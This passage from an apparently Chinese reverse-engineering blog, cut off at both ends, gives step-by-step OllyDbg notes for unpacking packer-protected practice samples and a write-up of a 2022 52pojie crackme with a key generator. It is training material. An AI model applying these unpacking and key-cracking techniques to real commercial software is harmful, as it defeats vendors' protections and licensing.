VirtualProtect`，处理IAT加密。Shift+F9，注意寄存器ecx。当运行到ecx=00401000时，Alt+F9返回，取消断点。右键->查找->命令(Ctrl+F)，输入`push 100`，勾选“整个块”来到这里。(不勾选会找错地址，血的教训！)\n\n```asm\n00B42EC0    55              push ebp;修改为retn\n00B42EC1    8BEC            mov ebp,esp\n00B42EC3    83EC 2C         sub esp,0x2C\n00B42EC6    833D 20F6BB00 0>cmp dword ptr ds:[0xBBF620],0x0\n00B42ECD    75 59           jnz short 00B42F28\n00B42ECF    C745 EC 13004BB>mov dword ptr ss:[ebp-0x14],0xBA4B0013\n00B42ED6    68 00010000     push 0x100\n```\n\n将第1行代码修改为`retn`，因为下面的代码是执行加密。\n\n之后再下断点`bp CreateThread`或者去到`M`模块`.text`下断运行，单步跟踪同样去到OEP。 \n\n## 7.10 Armadillo 4.40\n\n脱壳方法同7.9.1，`LoadLibraryA`下面的跳转就是magic jump？将它修改为`jmp`(什么时候修改为nop什么时候修改为nop？看它是否跳转？)\n\n```asm\n00AB5FE3    FF15 BC62AD00   call dword ptr ds:[0xAD62BC]             ; kernel32.LoadLibraryA\n00AB5FE9    8B0D AC40AE00   mov ecx,dword ptr ds:[0xAE40AC]\n00AB5FEF    89040E          mov dword ptr ds:[esi+ecx],eax\n00AB5FF2    A1 AC40AE00     mov eax,dword ptr ds:[0xAE40AC]\n00AB5FF7    391C06          cmp dword ptr ds:[esi+eax],ebx\n00AB5FFA    0F84 2F010000   je 00AB612F\n```\n\n之后同7.9.1\n\n用7.9.2方法好像不太可。\n\n## 7.11 PEBundle 2.0b5 - 3.0x\n\n用ESP定律找到OEP。脱壳后运行不了，但查壳没壳。考虑是importREC重建IAT时那些被我们剪切掉的指针是有用的，壳将它们加密了让我们以为那些指针没用。\n\n随便找一个无效指针偏移地址为`5517C`，在OD重载，命令窗口输入`d 45517C`，在它上面一行(有效指针)下硬件访问断点。F8几下跑飞，但被我们下的硬件断点截住了。断点上面的地址已经出现系统函数。\n\n```asm\n0045516C  7C8101B1  kernel32.lstrcpynA\n00455170  7C801D53  kernel32.LoadLibraryExA\n00455174  7C80A4B5  kernel32.GetThreadLocale\n00455178  0005589E\n0045517C  000558B0\n```\n\nF8走几下，发现这里是一个循环，并且`45517C`被加密。\n\n```asm\n00471E14    8B19            mov ebx,dword ptr ds:[ecx]\n00471E16    83C1 04         add ecx,0x4\n00471E19    85DB            test ebx,ebx                             ; UnPackMe.004558C4\n00471E1B    74 33           je short UnPackMe.00471E50\n00471E1D    8BC3            mov eax,ebx                              ; UnPackMe.004558C4\n00471E1F    F7C3 00000080   test ebx,0x80000000\n00471E25    74 08           je short UnPackMe.00471E2F\n00471E27    81E3 FFFF0000   and ebx,0xFFFF\n00471E2D    EB 04           jmp short UnPackMe.00471E33\n00471E2F    43              inc ebx                                  ; UnPackMe.004558C4\n00471E30    43              inc ebx                                  ; UnPackMe.004558C4\n00471E31    03DA            add ebx,edx                              ; UnPackMe.00400000\n00471E33    51              push ecx                                 ; UnPackMe.00455184\n00471E34    52              push edx                                 ; UnPackMe.00400000\n00471E35    899D C2214000   mov dword ptr ss:[ebp+0x4021C2],ebx      ; UnPackMe.004558C4\n00471E3B    53              push ebx                                 ; UnPackMe.004558C4\n00471E3C    FFB5 BA214000   push dword ptr ss:[ebp+0x4021BA]         ; kernel32.7C800000\n00471E42    E8 32010000     call UnPackMe.00471F79\n00471E47    5A              pop edx                                  ; UnPackMe.00471DBC\n00471E48    59              pop ecx                                  ; UnPackMe.00471DBC\n00471E49    85C0            test eax,eax                             ; UnPackMe.0047214A\n00471E4B    74 05           je short UnPackMe.00471E52\n00471E4D    AB              stos dword ptr es:[edi]\n00471E4E  ^ EB C4           jmp short UnPackMe.00471E14\n```\n\n```asm\n00455178  7C801EF2  kernel32.GetStartupInfoA\n0045517C  00471F79  UnPackMe.00471F79\n```\n\n再准确一点，程序运行完下面这条指令，`45517C`显示被加密。\n\n```asm\n00471E4D    AB              stos dword ptr es:[edi]\n```\n\nSTOS指令：是将AL/AX/EAX的值存储到[EDI]指定的内存单元中。\n\n往上看最近的eax就是call产生的。所以这个call很可能是加密函数。跟进去，着重看寄存器eax。我们已知`455178`的函数没有被加密，程序运行到这一步，eax显示函数。\n\n```asm\n00471FBF    85C0            test eax,eax                                       ; kernel32.GetStartupInfoA\n00471FC1   /74 25           je short UnPackMe.00471FE8;没有实现\n```\n\n到这一步eax显示为0。\n\n```asm\n00471FDF    85C0            test eax,eax\n00471FE1   /74 02           je short UnPackMe.00471FE5;跳转实现\n```\n\n一路到stos，函数出现在数据窗口。第二次循环就是我们要找的`45517C`的函数。进去到`471FBF`处，这已经显示了`45517C`未加密的系统函数`kernel32.GetProcAddress`，可以直接在import REC上修改。但我们需要将所有被加密的函数还原，不可能一个一个这样找，太麻烦了。\n\n```asm\n00471FBF    85C0            test eax,eax                                       ; kernel32.GetProcAddress\n00471FC1   /74 25           je short UnPackMe.00471FE8;没有实现\n```\n\n继续对比两者异同，到这一步eax显示的是加密函数`UnPackMe.00471F79`。\n\n```asm\n00471FDF    85C0            test eax,eax                                       ; UnPackMe.00471F79\n00471FE1    74 02           je short UnPackMe.00471FE5;没有实现\n```\n\n在`471FE1`处，未加密函数跳转实现而加密函数跳转未实现，所以应该将`471FE1`处的跳转改为`jmp`。继续单步观察数据窗口，验证修改是否正确。\n\n```asm\n00455178  7C801EF2  kernel32.GetStartupInfoA\n0045517C  7C80AE40  kernel32.GetProcAddress\n```\n\n复制到可执行文件，将新的程序载入OD寻找OEP，脱壳，没有无效指针，程序成功运行。\n\n## 7.12 PUNiSHER 1.5\n\n这个壳比较特殊，下面用原版OD进行破解。首先忽略所有异常，隐藏好OD。Options -> Debugging options -> Exceptions，全选。\n\n载入OD，程序停在此处。在命令行下断`bp LoadLibraryA+5`。\n\n```asm\n00408061 > /EB 04           jmp short UnPackMe.00408067\n00408063   |83A4BC CE60EB04>and dword ptr ss:[esp+edi*4+0x4EB60CE],0>\n0040806B    BC 0411E800     mov esp,0xE81104\n```\n\nShift + F9运行程序，查看堆栈变化，第一次：\n\n```asm\n0012FF98   FFFEBDA9\n0012FF9C   004083EC  RETURN to UnPackMe.004083EC\n0012FFA0   0040821F  ASCII \"USER32.DLL\"\n0012FFA4   005E5918\n```\n\nShift + F9第二次，已经看到`LoadLibraryA`了：\n\n```asm\n0012E9B4  /0012EA5C\n0012E9B8  |73FBE2BF  RETURN to usp10.73FBE2BF from kernel32.LoadLibraryA\n0012E9BC  |73FA1840  ASCII \"gdi32.dll\"\n0012E9C0  |73FBE4B9  usp10.<ModuleEntryPoint>\n```\n\n再Shift + F9一次，此时为我们的最佳返回时机。Alt + F9返回：\n\n```asm\n0012FF98   FFFA31E5\n0012FF9C   003C0470  RETURN to 003C0470\n0012FFA0   003C00B7  ASCII \"USER32.DLL\"\n0012FFA4   005E5918\n```\n\n取消断点，F8单步，遇到向上跳转时忽略，继续往下。直到去到`003C08C5`处。\n\n```asm\n003C08C5    8D85 ADD64100   lea eax,dword ptr ss:[ebp+0x41D6AD]\n003C08CB    870424          xchg dword ptr ss:[esp],eax              ; UnPackMe.00402494\n003C08CE    FF95 E1CE4100   call dword ptr ss:[ebp+0x41CEE1]         ; kernel32.OutputDebugStringA\n003C08D4    80BD E9CE4100 0>cmp byte ptr ss:[ebp+0x41CEE9],0x0\n```\n\n此时，信息窗口显示：\n\n```asm\nAddress=003C0892, (ASCII \"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\")\neax=00402494 (UnPackMe.00402494)\n```\n\n把上面的汇编代码前两行NOP掉，避免产生溢出错误。继续往下，来到两个连续的jmp指令。\n\n```asm\n003C0B1C  ^\\EB BF           jmp short 003C0ADD\t;不跳转\n003C0B1E  ^ E9 36FEFFFF     jmp 003C0959\t\t;跳转\n```\n\n第一个jmp指令不跳，第二个jmp指令跳转。跳转后继续单步，看到大跳转了，跳过去就是Stolen Code的开始处。\n\n```asm\n003C0959    8B85 EACE4100   mov eax,dword ptr ss:[ebp+0x41CEEA]\n003C095F    8D9D FEDC4100   lea ebx,dword ptr ss:[ebp+0x41DCFE]\n003C0965    50              push eax\n003C0966    E8 0E000000     call 003C0979\n003C096B    50              push eax\n003C096C    53              push ebx                                 ; UnPackMe.00400000\n003C096D    E8 8EF7FFFF     call 003C0100\n003C0972    83C4 08         add esp,0x8\n003C0975  - FF6424 FC       jmp dword ptr ss:[esp-0x4]\n003C0979    60              pushad\n003C097A    EB 04           jmp short 003C0980\n```\n\n跳过去是jmp指令，继续F8找到熟悉的VC程序入口，遇到近call要F7跟进去。\n\n```asm\n009F0000   /EB 04           jmp short 009F0006\n009F0002   |8182 8241D9EE E>add dword ptr ds:[edx+0xEED94182],0x8C83>\n009F000C    8C82 DB5C24FC   mov word ptr ds:[edx+0xFC245CDB],es\n009F0012    EB 04           jmp short 009F0018\n```\n\n来到这儿时，终于看到被抽取代码的了，VC程序入口：\n\n```asm\n009F022D    90              nop\n009F022E    64:A1 00000000  mov eax,dword ptr fs:[0]\n009F0234    50              push eax\n009F0235    64:8925 0000000>mov dword ptr fs:[0],esp\n009F023C    83EC 68         sub esp,0x68\n009F023F    53              push ebx\n009F0240    56              push esi                                 ; UnPackMe.00404038\n009F0241    57              push edi                                 ; UnPackMe.00407B90\n009F0242    8965 E8         mov dword ptr ss:[ebp-0x18],esp\n009F0245    33DB            xor ebx,ebx\n009F0247    895D FC         mov dword ptr ss:[ebp-0x4],ebx\n```\n\n但是前面还缺少了55开头的OEP，此时堆栈前2行就是第4、第5行push的地址。自行补上：\n\n```asm\npush ebp\nmov ebp esp\npush -1\npush 004023D0\npush 00401616\n```\n\n继续找被抽取的代码：\n\n```asm\n009F02B7    90              nop\n009F02B8    FF15 7C214000   call dword ptr ds:[0x40217C]             ; msvcrt.__set_app_type\n009F02BE    59              pop ecx\n009F02BF    830D 3C314000 F>or dword ptr ds:[0x40313C],0xFFFFFFFF\n009F02C6    830D 40314000 F>or dword ptr ds:[0x403140],0xFFFFFFFF\n009F02CD    FF15 78214000   call dword ptr ds:[0x402178]             ; msvcrt.__p__fmode\n009F02D3    8B0D 30314000   mov ecx,dword ptr ds:[0x403130]\n009F02D9    8908            mov dword ptr ds:[eax],ecx\n009F02DB    FF15 74214000   call dword ptr ds:[0x402174]             ; msvcrt.__p__commode\n009F02E1    8B0D 2C314000   mov ecx,dword ptr ds:[0x40312C]\n009F02E7    8908            mov dword ptr ds:[eax],ecx\n009F02E9    A1 70214000     mov eax,dword ptr ds:[0x402170]\n009F02EE    8B00            mov eax,dword ptr ds:[eax]\n009F02F0    A3 38314000     mov dword ptr ds:[0x403138],eax\n```\n\n遇到下面这种垃圾语句一定要将它改为NOP，否则程序会出错。\n\n```asm\n009F037C    0F31            rdtsc\n```\n\n接下来遇到这一语句，注释和信息窗口都显示0040开头，是我们的用户代码段，这里把指令转换，还原我们的真实地址。\n\n```asm\n009F03DA    8B6D 00         mov ebp,dword ptr ss:[ebp]               ; UnPackMe.00401615\n```\n\n即在被抽取代码段中添加`call 00401615`。\n\n运行到这不要retn，F4运行到jmp处，继续F8单步走。\n\n```asm\n009F0402    C3              retn\n009F0403    EB 04           jmp short 009F0409\n```\n\n提取最后一句被抽取代码，retn去到伪OEP`401504`处。\n\n```asm\n009F0409    90              nop\n009F040A    391D 50304000   cmp dword ptr ds:[0x403050],ebx;最后一句被抽取的代码\n009F0410    68 04154000     push 0x401504\n009F0415    C3              retn\n```\n\n总结一下被抽取的代码：\n\n```asm\npush ebp\nmov ebp esp\npush -1\npush 004023D0\npush 00401616\n009F022E    64:A1 00000000  mov eax,dword ptr fs:[0]\n009F0234    50              push eax\n009F0235    64:8925 0000000>mov dword ptr fs:[0],esp\n009F023C    83EC 68         sub esp,0x68\n009F023F    53              push ebx\n009F0240    56              push esi                                 ; UnPackMe.00404038\n009F0241    57              push edi                                 ; UnPackMe.00407B90\n009F0242    8965 E8         mov dword ptr ss:[ebp-0x18],esp\n009F0245    33DB            xor ebx,ebx\n009F0247    895D FC         mov dword ptr ss:[ebp-0x4],ebx\ncall 00401615\n009F040A    391D 50304000   cmp dword ptr ds:[0x403050],ebx\n```\n\n去到伪OEP，如果看到全是字节，右键 -> Analysis -> remove analysis from module 。这样就可以看到汇编代码了。\n\n```asm\n00401504   /75 0C           jnz short UnPackMe.00401512\n00401506   |68 12164000     push UnPackMe.00401612\n0040150B   |FF15 6C214000   call dword ptr ds:[0x40216C]             ; msvcrt.__setusermatherr\n00401511   |59              pop ecx                                  ; UnPackMe.00407B90\n00401512   \\E8 E9000000     call UnPackMe.00401600\n```\n\n往上拉发现代码被混淆，先不管。拉到retn下面的一句，也就是`4014A7`处，往下NOP到伪代码处。(后来发现4014A7不够，4014A6也需要NOP掉)\n\n```asm\n004014A1    c2 2513         retn 0x1325\n004014A4  ^ E3 A5           jecxz short UnPackMe.0040144B\n004014A6    cb              retf\n004014A7    7B D5           jpo short UnPackMe.0040147E\n004014A9    64:03d4         add edx,esp\n004014AC    3F              aas\n```\n\n发现`401504`也被NOP掉了，选中被NOP掉的前3行右键 -> Undo selection ，还原代码。\n\n```asm\n00401504    90              nop\n00401505    90              nop\n00401506    90              nop\n00401507    1216            adc dl,byte ptr ds:[esi]\n00401509    40              inc eax\n```\n\n接下来我们去段首可以选择二进制粘贴的形式，也可以采取逐一汇编的方式进行修改。\n\n二进制代码如下：\n\n```asm\n55 8B EC 6A FF 68 D0 23 40 00 68 16 16 40 00 64 A1 00 00 00 00 50 64 89 25 00 00 00 00 83 EC 68\n53 56 57 89 65 E8 33 DB 89 5D FC 6A 02 FF 15 7C 21 40 00 59 83 0D 3C 31 40 00 FF 83 0D 40 31 40\n00 FF FF 15 78 21 40 00 8B 0D 30 31 40 00 89 08 FF 15 74 21 40 00 8B 0D 2C 31 40 00 89 08 A1 70\n21 40 00 8B 00 A3 38 31 40 00 E8 17 01 00 00 39 1D 50 30 40 00\n```\n\n选中所有NOP二进制粘贴，新建EIP，运行loadPE和importREC，修正指针，脱壳成功。\n\n## 7.13  未知壳\n\n### 7.13.1 PolyBox\n\n这个是个捆绑壳，意思是伪装成其他类别的壳，加大脱壳的难度。\n\nPEID查壳显示FSG壳，这种壳用了FSG的外衣，把要加壳的程序当成一种资源加密起来。\n\n用FSG专用的ESP定律找到第2层壳的OEP。\n\n```asm\n00402F18    55              push ebp\n00402F19    8BEC            mov ebp,esp\n00402F1B    83C4 F0         add esp,-0x10\n00402F1E    B8 C02E4000     mov eax,UnPackMe.00402EC0                ; ASCII \"\\n\"\n```\n\n在命令窗口输入`bp WriteProcessMemory`。`WriteProcessMemory`是读取程序的大小，也可以解释为处理写入的数据。F9运行，程序停在dll领空，查看堆栈窗口，它给程序写入了起始地址为`3D0000`的程序。\n\n```asm\n0012FDE4   0040201B  /CALL 到 WriteProcessMemory 来自 UnPackMe.00402016\n0012FDE8   00000048  |hProcess = 00000048 (window)\n0012FDEC   00400000  |Address = 0x400000\n0012FDF0   003D0000  |Buffer = 003D0000\n0012FDF4   00001000  |BytesToWrite = 1000 (4096.)\n0012FDF8   0012FF48  \\pBytesWritten = 0012FF48\n0012FDFC   0012FE08  指向下一个 SEH 记录的指针\n```\n\n用LoadPE找到进程，右键->区域转存，找到起始地址为`3D0000`的区域转存，后缀名改为exe即可运行。\n\n### 7.13.2 UPX(Stolen Code) \n\n单步和ESP定律都不太行，用两次内存镜像到达一串jmp指令的地方。\n\n```asm\n004014E4  - FF25 1C204000   jmp dword ptr ds:[<&MFC42.#CWinApp::InitApplication_3922>]                ; mfc42.#CWinApp::InitApplication_3922\n004014EA  - FF25 20204000   jmp dword ptr ds:[<&MFC42.#CWinApp::AddToRecentFileList_1089>]            ; mfc42.#CWinApp::AddToRecentFileList_1089\n```\n\n很明显这是由MFC写的程序，拿一个完整的MFC程序做对比。\n\n```asm\n0040163D     C3                        RETN\n0040163E   - FF25 94214000             JMP DWORD PTR DS:[<&msvcrt.__CxxFrameHandler>]  \n00401644     CC                        INT3\n00401645     CC                        INT3\n0040164F     CC                        INT3\n00401650   - FF25 90214000             JMP DWORD PTR DS:[<&msvcrt._except_handler3>]   \n00401656     55                        PUSH EBP;这里是OEP\n00401657     8BEC                      MOV EBP,ESP\n00401659     6A FF                     PUSH -1\n0040165B     68 E0234000               PUSH 004023E0\n00401660     68 50164000               PUSH <JMP.&msvcrt._except_handler3>             \n00401665     64:A1 00000000            MOV EAX,DWORD PTR FS:[0]\n```\n\n被偷代码的程序：\n\n```asm\n004016F5    C3              retn\n004016F6  - FF25 A4214000   jmp dword ptr ds:[<&MSVCRT.__CxxFrameHandler>]               ; msvcrt.__CxxFrameHandler\n004016FC    CC              int3\n004016FD    CC              int3\n004016FE    CC              int3\n004016FF    CC              int3\n00401700    98              cwde\n00401701    e5 27           in eax,0x27\n00401703    69AB ED2F71B3 0>imul ebp,dword ptr ds:[ebx-0x4C8ED013],0xC6844200\n0040170D    084A 64         or byte ptr ds:[edx+0x64],cl\n00401710    A1 00000000     mov eax,dword ptr ds:[0]\n```\n\nOEP前面的代码都是一样的，所以我们要找`<&msvcrt._except_handler3>`函数的地址。查看与它同模块的`<&MSVCRT.__CxxFrameHandler>`的地址(双击即可查看)为`4021A4`，在命令窗口输入`d 4021A4`回车。\n\n```asm\n00402194 >77C05C94  msvcrt._except_handler3\n00402198 >77C1EE4F  msvcrt._controlfp\n0040219C >77C04DF8  msvcrt._onexit\n004021A0 >77C04E51  msvcrt.__dllonexit\n004021A4 >77BF27FA  msvcrt.__CxxFrameHandler\n```\n\n很容易找到`<&msvcrt._except_handler3>`的地址为`402194`，然后是入口代码，都一样的，只有两个下面的push指令不一样。因为第二个push也刚好是`<&msvcrt._except_handler3>`函数地址，所以我们只需找第一个push的地址。\n\n把堆栈窗口的滚动条往下拉到底(因为最先压栈的在最底部)，从下往上看，找到第一个压入的程序函数，就是我们第一个push进去的地址。\n\n```asm\n0012FFD0   0012FFE0  指向下一个 SEH 记录的指针\n0012FFD4   00401886  SE处理程序\n0012FFD8   00402500  UnPackMe.00402500;程序函数，所以是这个\n0012FFDC   00000000\n0012FFE0   0012CFA0  指向下一个 SEH 记录的指针\n0012FFE4   7C839AD8  SE处理程序\n0012FFE8   7C817080  返回到 kernel32.7C817080;这个是系统函数，不是\n0012FFEC   00000000\n0012FFF0   00000000\n0012FFF4   00000000\n0012FFF8   00407000  UnPackMe.<ModuleEntryPoint>;这个是入口点\n0012FFFC   00000000\n```\n\n还有最后一句，正常程序的代码为`64:A1 00000000`，而加壳程序的代码与上面一句混淆了，所以也要将它修改为`64:A1 00000000`。\n\n将代码拼凑起来，由于中间的代码不够用，所以把第1行jmp去掉，因为其它代码都是入口点必须的。\n\n```asm\njmp 402194;去掉\npush ebp\nmov ebp,esp\npush -1\npush 402500\npush 402194\nmov eax,dword ptr fs:[0]\n```\n\n```asm\n00401700    55              push ebp;将此处设置为新EIP\n00401701    8BEC            mov ebp,esp\n00401703    6A FF           push -0x1\n00401705    68 00254000     push UnPackMe.00402500\n0040170A    68 94214000     push <&MSVCRT._except_handler3>\n0040170F    64:A1 00000000  mov eax,dword ptr fs:[0]\n```\n\n这时用ODdump说“不能创建程序”，用LoadPE也不能抓取进程，是因为这个程序由反调试功能。用任务管理器将程序进程结束，再在OD用ODdump即可。\n\n### 7.13.3 yoda's Protector 1.03.3\n\nPEID说是这个壳，但也不知道是不是。OD载入\n\n```asm\n0040A6ED >  E8 03000000     call UnPackMe.0040A6F5\n0040A6F2    EB 01           jmp short UnPackMe.0040A6F5\n0040A6F4    E9 BB550000     jmp UnPackMe.0040FCB4\n```\n\n忽略除非法内存访问的所有异常，在StrongOD中取消勾选“跳过某些异常”。重载，F9运行。程序停在空白代码处。\n\n方法一：此时堆栈窗口显示\n\n```asm\n0012EBE0   0012EC70  指向下一个 SEH 记录的指针\n0012EBE4   0040CA2C  SE处理程序\n```\n\n在反汇编窗口Ctrl+G，跟随SE句柄。F2下断，Shift+F9运行，取消断点。\n\n```asm\n0040CA2C    55              push ebp\n0040CA2D    8BEC            mov ebp,esp\n0040CA2F    57              push edi\n```\n\nF8往下，走到此处EDI的值就是OEP。\n\n```asm\n0040CA55    3E:89B8 B800000>mov dword ptr ds:[eax+0xB8],edi          ; UnPackMe.00401700\n```\n\nCtrl+G跟随`401700`到达OEP。脱壳，一定要修正镜像大小。这个程序是有涉及到锁键盘、锁任务栏的，但可以用这种方法巧妙绕过。\n\n方法二：在`M`模块`.text`处下断，Shift+F9也能运行到\n\n```asm\n0040CA2C    55              push ebp\n0040CA2D    8BEC            mov ebp,esp\n0040CA2F    57              push edi\n```\n\n往后操作一样。\n\n","categories":["Windows逆向"],"tags":["吾爱破解培训","脱壳"]},{"title":"吾爱破解2022春节——Windows中级题","url":"/posts/5ada4708.html","content":"\n拿到程序的第一时间运行一下，熟悉一下程序的流程。这个程序的流程是要我们输入UID和key。用PE工具查一下壳，发现有UPX壳，用ESP定律即可脱壳。验证程序是否脱壳成功，可载入OD看是否能查询到字符串，或载入IDA查看是否有函数或是否可以反编译出伪代码。脱壳后还要保证程序与未脱壳程序执行的流程要一致。\n\n<!--more-->\n\n# IDA静态分析\n\n```c++\n...\n  SetConsoleTitleA(\"【2022春节】解题领红包之三\");\n  sub_403930((int)dword_41DDD0, \"Input your UID: \");\n  sub_402800(&v27);\n  if ( v27 > 2000000 )                          // v27 == UID,不能大于2000000\n  {\n    v3 = sub_403930((int)dword_41DDD0, \"Invalid UID, please input again.\");\n    sub_402660(10);\n    v4 = 0;\n    ...\n  }\n  sub_403930((int)dword_41DDD0, \"Input your Key: \");\n  sub_403BC0(&dword_41DE60, &v29);              // v29 == key\n  v8 = sub_401100(v27);                         // v8 = UID % 25\n  v9 = sub_401080(v27);                         // v9 = map[UID % 12]\n  v25 = sub_401110(v9);                         // 与v9有关，即与map[UID % 12]有关\n  v24 = v8;                                     // v24 = v8 = UID % 25\n  v28 = &v20;\n  sub_402460((int)&v20, (int)&v29);             // v20 = v29 = key\n  if ( sub_401520(v20, v21, v22, v23, v24, v25) == 1 )// 与key, UID % 12和UID % 25有关，关键函数\n  {\n    v10 = sub_403930((int)dword_41DDD0, \"Success\");\n    sub_402660(10);\n    v11 = 0;\n    ...\n  }\n...\n```\n\n```c++\nint __cdecl sub_401100(signed int a1)\n{\n  return a1 % 25;\n}\n```\n\n```c++\nint __cdecl sub_401080(signed int a1)\n{\n  int v2; // [sp+0h] [bp-30h]@1\n  int v3; // [sp+4h] [bp-2Ch]@1\n  int v4; // [sp+8h] [bp-28h]@1\n  int v5; // [sp+Ch] [bp-24h]@1\n  int v6; // [sp+10h] [bp-20h]@1\n  int v7; // [sp+14h] [bp-1Ch]@1\n  int v8; // [sp+18h] [bp-18h]@1\n  int v9; // [sp+1Ch] [bp-14h]@1\n  int v10; // [sp+20h] [bp-10h]@1\n  int v11; // [sp+24h] [bp-Ch]@1\n  int v12; // [sp+28h] [bp-8h]@1\n  int v13; // [sp+2Ch] [bp-4h]@1\n\n  v2 = 1;\n  v3 = 3;\n  v4 = 5;\n  v5 = 7;\n  v6 = 9;\n  v7 = 11;\n  v8 = 15;\n  v9 = 17;\n  v10 = 19;\n  v11 = 21;\n  v12 = 23;\n  v13 = 25;\n  return *(&v2 + a1 % 12);\n}\n```\n\n```c++\nchar __cdecl sub_401520(char a1, int a2, int a3, int a4, signed int a5, int a6)\n{\n  ...\n  v19 = v18;\n  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(0);\n  sub_4034E0(\"flag\", strlen(\"flag\"));   // flag初始化\n  v23 = v18;\n  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(0);\n  sub_4034E0(&dword_41A0F8, strlen((const char *)&dword_41A0F8));\n  ...\n  sub_402BE0(&dword_41A0B0, strlen((const char *)&dword_41A0B0));// flag初始化后：v19[]=flag{Happy_New_Year_52Pojie_2022}\n  v17 = a5;                                     // v17 = UID % 25\n  v16 = a6;                                     // v16 = map[UID % 12]\n  v51 = &v12;\n  sub_402460((int)&v12, (int)&a1);              // v12 = a1 = key\n  sub_4011B0((int)&v50, v12, v13, v14, v15, v16, v17);// 这个关键函数的返回值存到v50[],也就是说我们输入的key要经过转换才能变成v19[]\n  LOBYTE(v52) = 29;\n  v8 = sub_403ED0((int)&v50, (int)&v19);        // v8 == 0，字符串比较函数,比较v19[]与v50[]\n  LOBYTE(v52) = 28;\n  v17 = 1;\n  if ( v8 )                                     // v8 == 0\n  {\n      ...\n          return = 0;\t\t\t\t\t\t\t// 返回0是错的，可以不看\n  }\n  else\n  {\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(v17);\n    LOBYTE(v52) = 27;\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(1);\n    LOBYTE(v52) = 26;\n    ...\n std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(1);\n    LOBYTE(v52) = 0;\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(1);\n    v52 = -1;\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(1);\n    result = 1;\n  }\n  return result;\n}\n```\n\n由于`sub_4011B0`里面的算法看伪代码太过复杂，想直观看到key变换成什么，可以用OllyDbg动态调试，直接看比较函数`sub_403ED0`出来的与原key比较。\n\n# OD动态调试\n\n程序说的UID其实是吾爱论坛的UID，我看大牛们wp时百度了好久UID在哪里查看...\n\n载入OD，输入自己的UID和随便的key，比如hhhhhhhhhhhh。输入完后去到`sub_401520`进去，再去到`sub_403ED0`下断运行至此处。\n\n```asm\n00401CB2    E8 F9F4FFFF     call dumped_.004011B0\n00401CB7    83C4 1C         add esp,0x1C\t\t\t\t\t;403ED0参数从这里开始\n00401CBA    8D4C24 10       lea ecx,dword ptr ss:[esp+0x10]\n00401CBE    C68424 EC010000>mov byte ptr ss:[esp+0x1EC],0x1D\n00401CC6    51              push ecx\t\t\t\t\t\t;第二个参数入栈v19[]=flag{Happy_New_Year_52Pojie_2022}的首地址\n00401CC7    8D8C24 D4010000 lea ecx,dword ptr ss:[esp+0x1D4];第一个参数的首地址在ecx中(v50[])\n00401CCE    E8 FD210000     call dumped_.00403ED0\n```\n\n为了验证入栈的是否是v19，可查看堆栈窗口。\n\n```asm\n0012FD44   0012FD58\t;首地址为0012FD58\n0012FD48   006B5B28\n0012FD4C   00000017\n0012FD50   0012FFC0\n0012FD54   FFFFFFFF\n0012FD58   003200FF\t;但这个并不是v19,再下一个地址才是\n0012FD5C   00392009  ASCII \"flag{Happy_New_Year_52Pojie_2022}\"\n```\n\n再找ecx->数据窗口中跟随，同理，第二个地址存放的是比较的数据。\n\n```asm\n0012FF18  00 00 00 00 99 20 39 00 0C 00 00 00 1F 00 00 00  ....?9.....\u001f...\n```\n\n继续数据窗口跟随，我们输入的“h”已经全变为“q”了。说明很有可能是单表替换中的移位密码，位数为9。\n\n```asm\n00392099  71 71 71 71 71 71 71 71 71 71 71 71 00 00 00 00  qqqqqqqqqqqq....\n```\n\n再试多几次验证一下，发现不是移位密码！\n\nhappynewyear->qxiizktbztxg，只是普通的单表替换。\n\n| a    | b    | c    | d    | e    | f    | g    | h    | i    | j    | k    | l    | m    | n    | o    | p    | q    | r    | s    | t    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| x    | w    | v    | u    | t    | s    | r    | q    | p    | o    | n    | m    | l    | k    | j    | i    | h    | g    | f    | e    |\n\n| u    | v    | w    | x    | y    | z    | A    | B    | C    | D    | E    | F    | G    | H    | I    | J    | K    | L    | M    | N    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| d    | c    | b    | a    | z    | y    | X    | W    | V    | U    | T    | S    | R    | Q    | P    | O    | N    | M    | L    | K    |\n\n| O    | P    | Q    | R    | S    | T    | U    | V    | W    | X    | Y    | Z    | 0    | 1    | 2    | 3    | 4    | {    | _    | ...  |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| J    | I    | H    | G    | F    | E    | D    | C    | B    | A    | Z    | Y    | 0    | 1    | 2    | 3    | 4    | {    | _    | ...  |\n\n所以`flag{Happy_New_Year_52Pojie_2022}`逆过来就是`smxr{Qxiiz_Ktb_Ztxg_52Ijopt_2022}`\n\n{% asset_img 成功截图.png 成功 %}\n\n注意，这个只是在我UID为1787123的情况下的替换表，UID不同替换表也不同。我看wp说这其实是仿射密码，也就是替换表与静态分析`map[UID % 12]`，`UID % 25`其实是有关系的。\n\n会的还是太少了，仿射密码的加解密原理自行百度，这里不想写了，最后附上大牛的注册机：\n\n```c\n#include <stdio.h>\n#include <string.h>\nchar const flag[] = \"flag{Happy_New_Year_52Pojie_2022}\";\nint map[] = {1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25};\nint main()\n{\n    int uid;\n    while (scanf(\"%d\", &uid) != EOF)\n    {\n        int A = map[uid % 12];\n        int B = uid % 25;\n        char buf[sizeof(flag)];\n        strcpy(buf, flag);\n        char *p = buf;\n        while (*p)\n        {\n            if ('a' <= *p && *p <= 'z')\n            {\n                *p = ((*p - 'a') * A + B) % 26 + 'a';\n            }\n            else if ('A' <= *p && *p <= 'Z')\n            {\n                *p = ((*p - 'A') * A + B) % 26 + 'A';\n            }\n            ++p;\n        }\n        printf(\"%s\\n\", buf);\n    }\n    return 